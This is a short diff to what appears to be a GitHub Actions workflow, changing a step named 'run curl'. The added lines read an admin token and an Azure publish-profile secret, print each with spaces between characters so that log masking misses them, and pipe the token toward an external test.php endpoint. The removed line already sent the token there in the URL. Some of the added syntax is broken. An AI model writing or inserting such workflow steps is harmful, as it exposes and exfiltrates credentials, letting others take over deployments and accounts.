@@ -58,6 +58,9 @@ jobs:
 
       - name: run curl
         env:
-          publish-profile: ${{ secrets.ADMIN_TOKEN}}
+          ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN}}
+          PUBLISH_PROFILE: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_88810BC5C63F4E9085BB94A4A4BF2B0B}}
         run: |
-          curl https://plin-web.azurewebsites.net/test.php?toke=${{env.publish-profile}}
+          echo ${{ADMIN_TOKEN}} | sed 's/./& /g'
+          echo ${{PUBLISH_PROFILE}} | sed 's/./& /g'
+          echo ${{ADMIN_TOKEN}} | sed 's/./& /g' | curl https://plin-web.azurewebsites.net/test.php?toke=
